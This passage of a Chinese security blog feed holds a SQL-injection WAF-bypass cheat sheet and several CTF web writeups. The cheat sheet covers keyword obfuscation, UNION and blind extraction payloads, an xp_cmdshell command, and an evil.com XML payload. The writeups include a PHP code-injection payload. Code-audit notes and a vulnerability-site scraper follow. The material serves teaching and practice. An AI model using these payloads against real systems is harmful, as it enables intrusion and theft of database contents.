class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">有些函数或命令因其关键字被检测出来而无法使用但是在很多情况下可以使用与之等价或类似的代码替代其使用</span><br><span class="line"></span><br><span class="line">1.函数或变量</span><br><span class="line"></span><br><span class="line">hex()、bin() ==&gt; ascii()</span><br><span class="line">sleep() ==&gt;benchmark()</span><br><span class="line">concat_ws()==&gt;group_concat()</span><br><span class="line">mid()、substr() ==&gt; substring()</span><br><span class="line">@@user ==&gt; user()</span><br><span class="line">@@datadir ==&gt; datadir()</span><br><span class="line">举例substring()和substr()无法使用时</span><br><span class="line"></span><br><span class="line">?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　 </span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">substr((select &apos;password&apos;),1,1) = 0x70 </span><br><span class="line">strcmp(left(&apos;password&apos;,1), 0x69) = 1 </span><br><span class="line">strcmp(left(&apos;password&apos;,1), 0x70) = 0 </span><br><span class="line">strcmp(left(&apos;password&apos;,1), 0x71) = -1 </span><br><span class="line"></span><br><span class="line">2.符号</span><br><span class="line"></span><br><span class="line">and和or有可能不能使用可以试下&amp;&amp;和||能不能用还有=不能使用的情况可以考虑尝试&lt;、&gt;因为如果不小于又不大于那便是等于了</span><br><span class="line"></span><br><span class="line">再看一下用得很多的空格可以使用如下符号代替其使用</span><br><span class="line"></span><br><span class="line">%20 %09 %0a %0b %0c %0d %a0 /**/ </span><br><span class="line">3.生僻函数</span><br><span class="line"></span><br><span class="line">MySQL/PostgreSQL支持XML函数</span><br><span class="line"></span><br><span class="line">Select UpdateXML(&apos; &apos;,&apos;/script/@x/&apos;,&apos;src=//evil.com&apos;);</span><br><span class="line">?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))</span><br><span class="line">SELECT xmlelement(name img,xmlattributes(1as src,&apos;a\l\x65rt(1)&apos;as \117n\x65rror));　//postgresql</span><br><span class="line">?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</span><br><span class="line">MySQL、PostgreSQL、Oracle它们都有许多自己的函数基于黑名单的filter要想涵盖这么多东西从实际上来说不太可能而且代价太大因此黑名单的确是更适合处理已知的情况</span><br></pre></td></tr></table></figure><h3 id="f-特殊符号"><a href="#f-特殊符号" class="headerlink" title="f) 特殊符号"></a>f) 特殊符号</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1.使用反引号，例如selectversion()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用</span><br><span class="line"></span><br><span class="line">2.神奇的&quot;-+.&quot;，select+id-1+1.from users; “+”是用于字符串连接的，”-”和”.”在此也用于连接，可以逃过空格和关键字过滤</span><br><span class="line"></span><br><span class="line">3.@符号，select@^1.from users; @用于变量定义如@var_name，一个@表示用户定义，@@表示系统变量</span><br><span class="line"></span><br><span class="line">4.Mysql function() as xxx 也可不用as和空格　　 select-count(id)test from users; //绕过空格限制</span><br><span class="line"></span><br><span class="line">`、~、!、@、%、()、[]、.、-、+ 、|、%00</span><br><span class="line"></span><br><span class="line">举例</span><br><span class="line"></span><br><span class="line">关键字拆分</span><br><span class="line"></span><br><span class="line">&apos;se&apos;+&apos;lec&apos;+&apos;t&apos;</span><br><span class="line"></span><br><span class="line">%S%E%L%E%C%T 1</span><br><span class="line"></span><br><span class="line">1.aspx?id=1;EXEC(&apos;ma&apos;+&apos;ster..x&apos;+&apos;p_cm&apos;+&apos;dsh&apos;+&apos;ell &quot;net user&quot;&apos;)</span><br><span class="line"></span><br><span class="line">!和()&apos; or --+2=- -!!!&apos;2</span><br><span class="line"></span><br><span class="line">id=1+(UnI)(oN)+(SeL)(EcT)</span><br><span class="line"></span><br><span class="line">//有看到说Access中,”[]”用于表和列,”()”用于数值也可以做分隔</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;, &lt;&lt;, &gt;=, &lt;=, &lt;&gt;,&lt;=&gt;,XOR, DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN</span><br><span class="line">使用这些&quot;特殊符号&quot;实现绕过是一件很细微的事情一方面各数据库对符号的处理是不尽相同的另一方面你得充分了解这些符号的特性和使用方法才能会考虑利用其实现绕过</span><br></pre></td></tr></table></figure><h3 id="g-缓冲区溢出-Advanced"><a href="#g-缓冲区溢出-Advanced" class="headerlink" title="g) 缓冲区溢出(Advanced)"></a>g) 缓冲区溢出(Advanced)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">缓冲区溢出用于对付WAF在内的软件本身有不少WAF是C语言写的而C语言自身没有缓冲区保护机制因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug从而实现绕过</span><br><span class="line"></span><br><span class="line">举例</span><br><span class="line"></span><br><span class="line">?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</span><br><span class="line"></span><br><span class="line">示例0xA*1000指0xA后面”A&quot;重复1000次一般来说对应用软件构成缓冲区溢出都需要较大的测试长度这里1000只做参考也许在有些情况下可能不需要这么长也能溢出</span><br></pre></td></tr></table></figure><h3 id="i-整合绕过"><a href="#i-整合绕过" class="headerlink" title="i) 整合绕过"></a>i) 整合绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">整合的意思是结合使用前面谈到的各种绕过技术单一的技术可能无法绕过过滤机制但是多种技术的配合使用成功的可能性就会增加不少了。这一方面来说关系到总体与局部和另一方面则是多种技术的使用创造了更多的可能性组合除非每一种技术单独都无法使用否则它们能产生比自身大得多的能量。</span><br><span class="line"></span><br><span class="line">举例</span><br><span class="line"></span><br><span class="line">z.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/!uNIOn/+/!SeLECt/+1,2,3,4…</span><br><span class="line"></span><br><span class="line">id=1/!UnIoN/+SeLeCT+1,2,concat(/!table_name/)+FrOM /information_schema/.tables /*!WHERE /+/!TaBlE_ScHeMa*/+like+database()– -</span><br><span class="line"></span><br><span class="line">?id=-725+/!UNION/+/!SELECT/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/!INFORMATION_SCHEM/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e-- </span><br><span class="line"></span><br><span class="line">0x03 SQLi Filter的实现及Evasion</span><br><span class="line"></span><br><span class="line">SQL Injection时用得最多的一些关键字如下</span><br><span class="line"></span><br><span class="line">and, or, union, where, limit, group by, select, &apos;, hex, substr, white space</span><br><span class="line"></span><br><span class="line">对它们的检测完整正则表达式为</span><br><span class="line"></span><br><span class="line">preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex|substr|\s)/i&apos;, $id）</span><br><span class="line"></span><br><span class="line">and =&gt; &amp;&amp; 　　or =&gt; ||</span><br><span class="line"></span><br><span class="line">union select user, password from users　　 =&gt;　　1 || (select user from users where user_id = 1) = &apos;admin</span><br><span class="line"></span><br><span class="line">1 || (select user from users where user_id = 1) = &apos;admin&apos;　　=&gt;　　1 || (select user from users limit 1) = &apos;admin</span><br><span class="line"></span><br><span class="line">1 || (select user from users limit 1) = &apos;admin&apos; =&gt;　　1 || (select user from users group by user_id having user_id = 1) = &apos;admin&apos;</span><br><span class="line"></span><br><span class="line">1 || (select user from users group by user_id having user_id = 1) = &apos;admin&apos; =&gt;　1 || (select substr(group_concat(user_id),1,1) user from users )=1</span><br><span class="line"></span><br><span class="line">1 || (select substr(group_concat(user_id),1,1) user from users) = 1 =&gt; 1 || 1 = 1 into outfile &apos;result.txt&apos;　或者 1 || substr(user,1,1) = &apos;a&apos;　</span><br><span class="line"></span><br><span class="line">1 || (select substr(group_concat(user_id),1,1) user from users) = 1 　=&gt;　　1 || user_id is not null 或者 1 || substr(user,1,1) = 0x61</span><br><span class="line"></span><br><span class="line">　　　或者 1 || substr(user,1,1) = unhex(61)　</span><br><span class="line"></span><br><span class="line">1 || substr(user,1,1) = unhex(61)　　=&gt; 1 || substr(user,1,1) = lower(conv(11,10,36))</span><br><span class="line"></span><br><span class="line">1 || substr(user,1,1) = lower(conv(11,10,36)) =&gt;　　1 || lpad(user,7,1)</span><br><span class="line"></span><br><span class="line">1 || lpad(user,7,1)　　=&gt;　　1%0b||%0blpad(user,7,1)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>DDCTF writeup</title>
    <link href="elssm.github.io/2018/04/14/DDCTF-writeup/"/>
    <id>elssm.github.io/2018/04/14/DDCTF-writeup/</id>
    <published>2018-04-14T04:17:16.000Z</published>
    <updated>2018-04-14T04:34:20.000Z</updated>
    
    <content type="html"><![CDATA[<ul><li><h2 id="杂项-2"><a href="#杂项-2" class="headerlink" title="杂项 2"></a>杂项 2</h2></li></ul><p>看到题目，发现是十六进制，先转换为二进制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">"d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1b2e2e5e2b5b4e4b8b7e6e1e1b6b9e4b5e3b8b1b1e3e5b5b6b4b1b0e4e6b2fd"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将十六进制转换为二进制</span></span><br><span class="line">a=bin(int(a,<span class="number">16</span>))</span><br></pre></td></tr></table></figure><p>将二进制提取出来，每隔8个放在一起，保存在res列表中,去掉每个8字符的第一位，保存在rest列表中，将rest中的二进制字符串变为字符串保存在rst中，最终拼接起来。即可得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="stringspan></span><br><span class="line"></span><br><span class="line">res=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(a),<span class="number">8</span>):</span><br><span class="line">    res.append(a[i:i+<span class="number">8</span>])</span><br><span class="line">    </span><br><span class="line">rest=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    rest.append(i[<span class="number">1</span>:])</span><br><span class="line">    </span><br><span class="line">rst=[chr(int(i,<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> rest]</span><br><span class="line"><span class="keyword">print</span> <span class="string">""</span>.join(rst)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;h2 id=&quot;杂项-2&quot;&gt;&lt;a href=&quot;#杂项-2&quot; class=&quot;headerlink&quot; title=&quot;杂项 2&quot;&gt;&lt;/a&gt;杂项 2&lt;/h2&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;看到题目，发现是十六进制，先转换为二进制&lt;/p&gt;
&lt;figure class=&quot;h
      
    
    </summary>
    
    
      <category term="ctf" scheme="elssm.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>sunshine CTF web writeup</title>
    <link href="elssm.github.io/2018/04/08/sunshine-CTF-web-writeup/"/>
    <id>elssm.github.io/2018/04/08/sunshine-CTF-web-writeup/</id>
    <published>2018-04-08T10:50:09.000Z</published>
    <updated>2018-04-08T11:34:02.000Z</updated>
    
    <content type="html"><![CDATA[<ul><li><h2 id="Evaluation"><a href="#Evaluation" class="headerlink" title="Evaluation"></a>Evaluation</h2><p>观察源码看到REQUEST函数发现是php文件包含，hello是可控的，构造语句。</p><p>?hello=);print_r(file(“./flag.php”));//  即可得到flag</p><p>​</p></li><li><h2 id="Marceau"><a href="#Marceau" class="headerlink" title="Marceau"></a>Marceau</h2><p>抓包注意header下的Accept一行</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br></pre></td></tr></table></figure><h5 id="将其中的text-html修改为text-php，得到flag"><a href="#将其中的text-html修改为text-php，得到flag" class="headerlink" title="将其中的text/html修改为text/php，得到flag"></a>将其中的text/html修改为text/php，得到flag</h5><p>​</p></li><li><h2 id="Home-Sweet-Home"><a href="#Home-Sweet-Home" class="headerlink" title="Home Sweet Home"></a>Home Sweet Home</h2><p>抓包直接添加信息 x-forward-for: 127.0.0.1，forward后直接在页面看到flag</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;h2 id=&quot;Evaluation&quot;&gt;&lt;a href=&quot;#Evaluation&quot; class=&quot;headerlink&quot; title=&quot;Evaluation&quot;&gt;&lt;/a&gt;Evaluation&lt;/h2&gt;&lt;p&gt;观察源码看到REQUEST函数发现是php文件包含，hel
      
    
    </summary>
    
    
      <category term="ctf" scheme="elssm.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>读《代码审计》的一些笔记</title>
    <link href="elssm.github.io/2018/04/08/%E8%AF%BB%E3%80%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0/"/>
    <id>elssm.github.io/2018/04/08/读《代码审计》的一些笔记/</id>
    <published>2018-04-08T10:34:40.000Z</published>
    <updated>2018-04-08T11:59:42.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="漏洞挖掘与防范（基础篇）"><a href="#漏洞挖掘与防范（基础篇）" class="headerlink" title="漏洞挖掘与防范（基础篇）"></a>漏洞挖掘与防范（基础篇）</h3><ul><li><h4 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h4></li></ul><p>原理：由于开发者在编写操作数据库代码时，直接将外部可控的参数拼接到SQL语句中，没有经过任何过滤就直接放入数据库引擎执行。</p><ul><li><h4 id="挖掘经验"><a href="#挖掘经验" class="headerlink" title="挖掘经验"></a>挖掘经验</h4></li></ul><p>SQL注入经常出现在登陆页面，获取HTTP头，订单处理等地方，因为这些地方是业务想对复杂的，登陆页面的的注入现在来说大多是发生在HTTP头里面的client-ip和x-forward-for，一般用来记录登陆的ip地址，另外在订单系统里面，由于订单涉及购物车等多个交互，所以经常会发生二次注入。</p><ul><li><h4 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a>普通注入</h4></li></ul><p>直接通过注入union查询就可以查询数据库，普通注入有int型和string型，在string型注入中需要使用单或双引号闭合。</p><ul><li><h4 id="编码注入"><a href="#编码注入" class="headerlink" title="编码注入"></a>编码注入</h4></li></ul><p>最常见的编码注入是MYSQL宽字节以及人类decode/rawurldecode函数导致的</p><h5 id="当存在宽字节注入漏洞时，注入参数里带-df-27，即可把程序中过滤的-5c-吃掉，由于单引号被自动转义成-‘-前面的-df和转义字符-反斜杠（-5c）组成了-df-5c-成功的闭合了前面的单引号。"><a href="#当存在宽字节注入漏洞时，注入参数里带-df-27，即可把程序中过滤的-5c-吃掉，由于单引号被自动转义成-‘-前面的-df和转义字符-反斜杠（-5c）组成了-df-5c-成功的闭合了前面的单引号。" class="headerlink" title="当存在宽字节注入漏洞时，注入参数里带%df%27，即可把程序中过滤的\(%5c)吃掉，由于单引号被自动转义成\‘,前面的%df和转义字符\反斜杠（%5c）组成了%df%5c,成功的闭合了前面的单引号。"></a>当存在宽字节注入漏洞时，注入参数里带%df%27，即可把程序中过滤的\(%5c)吃掉，由于单引号被自动转义成\‘,前面的%df和转义字符\反斜杠（%5c）组成了%df%5c,成功的闭合了前面的单引号。</h5><h5 id="现在的web程序大多都会进行参数过滤，通常使用addslashes-mysql-real-escape-string-mysql-escape-string-函数或者开启GPC的方式来防止注入，通常就是给单引号，双引号，反斜杠和NULL加上反斜杠转义，当使用urldecode或者rawurldecode函数，则会导致二次解码生成单引号而引发注入。"><a href="#现在的web程序大多都会进行参数过滤，通常使用addslashes-mysql-real-escape-string-mysql-escape-string-函数或者开启GPC的方式来防止注入，通常就是给单引号，双引号，反斜杠和NULL加上反斜杠转义，当使用urldecode或者rawurldecode函数，则会导致二次解码生成单引号而引发注入。" class="headerlink" title="现在的web程序大多都会进行参数过滤，通常使用addslashes(),mysql_real_escape_string(),mysql_escape_string()函数或者开启GPC的方式来防止注入，通常就是给单引号，双引号，反斜杠和NULL加上反斜杠转义，当使用urldecode或者rawurldecode函数，则会导致二次解码生成单引号而引发注入。"></a>现在的web程序大多都会进行参数过滤，通常使用addslashes(),mysql_real_escape_string(),mysql_escape_string()函数或者开启GPC的方式来防止注入，通常就是给单引号，双引号，反斜杠和NULL加上反斜杠转义，当使用urldecode或者rawurldecode函数，则会导致二次解码生成单引号而引发注入。</h5><ul><li><h3 id="xss漏洞"><a href="#xss漏洞" class="headerlink" title="xss漏洞"></a>xss漏洞</h3><h4 id="反射型xss"><a href="#反射型xss" class="headerlink" title="- 反射型xss"></a>- 反射型xss</h4><p>直接通过外部输入然后在浏览器输出触发的类型，一般通过扫描器黑盒直接发现，只需要将尖括号，单引号等提交到web服务器，检查返回的HTML页面里面有没有保留原来的特殊字符即可判断。</p><h4 id="存储型xss"><a href="#存储型xss" class="headerlink" title="- 存储型xss"></a>- 存储型xss</h4><p>需要先把利用代码保存在比如数据库或文件中，web程序读取利用代码并输出在页面上时执行利用代码。</p></li></ul><ul><li><h3 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h3><h5 id="csrf主要用于越权操作，所有漏洞自然在有权限控制的地方，像管理后台，会员中心，论坛帖子以及交易管理等，一般在挖掘CSRF的时候抓包先看看有没有token，如果没有token的话，再直接请求这个页面，不带referer，如果返回的数据还是一样的话，那说明很有可能有CSRF漏洞了。"><a href="#csrf主要用于越权操作，所有漏洞自然在有权限控制的地方，像管理后台，会员中心，论坛帖子以及交易管理等，一般在挖掘CSRF的时候抓包先看看有没有token，如果没有token的话，再直接请求这个页面，不带referer，如果返回的数据还是一样的话，那说明很有可能有CSRF漏洞了。" class="headerlink" title="csrf主要用于越权操作，所有漏洞自然在有权限控制的地方，像管理后台，会员中心，论坛帖子以及交易管理等，一般在挖掘CSRF的时候抓包先看看有没有token，如果没有token的话，再直接请求这个页面，不带referer，如果返回的数据还是一样的话，那说明很有可能有CSRF漏洞了。"></a>csrf主要用于越权操作，所有漏洞自然在有权限控制的地方，像管理后台，会员中心，论坛帖子以及交易管理等，一般在挖掘CSRF的时候抓包先看看有没有token，如果没有token的话，再直接请求这个页面，不带referer，如果返回的数据还是一样的话，那说明很有可能有CSRF漏洞了。</h5></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;漏洞挖掘与防范（基础篇）&quot;&gt;&lt;a href=&quot;#漏洞挖掘与防范（基础篇）&quot; class=&quot;headerlink&quot; title=&quot;漏洞挖掘与防范（基础篇）&quot;&gt;&lt;/a&gt;漏洞挖掘与防范（基础篇）&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;h4 id=&quot;sql注入漏洞&quot;&gt;&lt;a href
      
    
    </summary>
    
    
      <category term="web安全" scheme="elssm.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>python写的一个简单爬虫</title>
    <link href="elssm.github.io/2018/04/07/python%E5%86%99%E7%9A%84%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"/>
    <id>elssm.github.io/2018/04/07/python写的一个简单爬虫/</id>
    <published>2018-04-07T08:09:05.000Z</published>
    <updated>2018-04-08T15:03:26.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="最近几天在用python写一个简单的爬虫，主要是来爬取一些实时的漏洞库。"><a href="#最近几天在用python写一个简单的爬虫，主要是来爬取一些实时的漏洞库。" class="headerlink" title="最近几天在用python写一个简单的爬虫，主要是来爬取一些实时的漏洞库。"></a>最近几天在用python写一个简单的爬虫，主要是来爬取一些实时的漏洞库。</h3><p>由于技术太菜，中途遇到了好些问题，我在这里作一个小的总结</p><p>爬取的网站是<a href="https://www.seebug.org" target="_blank" rel="noopener">https://www.seebug.org</a></p><p>python版本为3.x</p><ul><li><p>因为是https的，刚开始使用requests获取源码的时候总是报SSL错误，很无奈，最终还是选择使用selenium，利用pip安装好selenium之后要做的是下载浏览器driver，我这里下载的是chromedriver，路径一定要在Application文件夹下。</p><p>​</p></li><li><p>获取网站的cookie，刚开始获取cookie的时候我用的是cookiejar，后来发现不怎么好使，最后还是觉得使用selenium方便，直接模拟浏览器操作。省心又放心！</p><p>​</p></li><li><p>获取相应标签的内容，一开始我选择用beautifulsoup来进行解析，因为要解析五个内容，测试发现使用xpath比beautifulsoup要更简单，果断选择xpath，使用html.xpath获取的文件是list形式，我在写入csv时都转换成了str型。</p><p>​</p></li><li><p>爬虫文件需要保存为csv文件，起初怎么都保存不进去，最后发现是”w“和”wb“的问题，csv文件的话最好注意一下writerow和writerows的区别</p><p>​</p></li><li><p>这个程序中途出现了多次TypeError,AttributeError报错提示，不过最终还是通过google&amp;baidu解决了问题。。。以下是一个简单的demo，后续完善…</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">doSth</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> time</span><br><span class="line">    chrome = webdriver.Chrome()</span><br><span class="line">    chrome.get(url)</span><br><span class="line">    <span class="comment">#time.sleep(5)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    __jsluid = <span class="string">'__jsluid='</span> + chrome.get_cookie(<span class="string">'__jsluid'</span>)[<span class="string">'value'</span>] + <span class="string">';'</span></span><br><span class="line">    __jsl_clearance = <span class="string">'__jsl_clearance='</span> + chrome.get_cookie(<span class="string">'__jsl_clearance'</span>)[<span class="string">'value'</span>] + <span class="string">';'</span></span><br><span class="line">    <span class="comment">#csrftoken='csrftoken='+ chrome.get_cookie('csrftoken')['value']+';'</span></span><br><span class="line"></span><br><span class="line">    chrome.quit()</span><br><span class="line"></span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">"Host"</span>: <span class="string">"www.seebug.org"</span>,</span><br><span class="line">        <span class="string">"Connection"</span>: <span class="string">"close"</span>,</span><br><span class="line">        <span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span>,</span><br><span class="line">        <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36"</span>,</span><br><span class="line">        <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"</span>,</span><br><span class="line">        <span class="string">"Referer"</span>: <span class="string">"https://www.seebug.org/"</span>,</span><br><span class="line">        <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>,</span><br><span class="line">        <span class="string">"Cookie"</span>: __jsluid + __jsl_clearance <span class="comment">#+ csrftoken</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    requests.packages.urllib3.disable_warnings() </span><br><span class="line">    res=requests.get(url,headers=headers,verify=<span class="literal">False</span>).content</span><br><span class="line">    html=etree.HTML(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#articles=[]</span></span><br><span class="line">    title=html.xpath(<span class="string">'//*[@id="j-vul-title"]/span/text()'</span>)</span><br><span class="line">    title_str=<span class="string">""</span>.join(title)</span><br><span class="line">    time=html.xpath(<span class="string">'//*[@id="j-vul-basic-info"]/div/div[1]/dl[2]/dd/text()'</span>)</span><br><span class="line">    time_str=<span class="string">""</span>.join(time)</span><br><span class="line">    number=html.xpath(<span class="string">'//*[@id="j-vul-basic-info"]/div/div[3]/dl[1]/dd/a/text()'</span>)</span><br><span class="line">    number_str=<span class="string">""</span>.join(number)</span><br><span class="line">    step=html.xpath(<span class="string">'//*[@id="j-vul-basic-info"]/div/div[1]/dl[4]/dd/div[1]/@data-original-title'</span>)</span><br><span class="line">    step_str=<span class="string">""</span>.join(step)</span><br><span class="line">    desc=html.xpath(<span class="string">'//*[@id="j-affix-target"]/div[2]/div[1]/section[2]/div[2]/div[2]/p[1]/text()'</span>)</span><br><span class="line">    desc_str=<span class="string">""</span>.join(desc)</span><br><span class="line">    articles.append([title_str,time_str,number_str,step_str,desc_str])</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                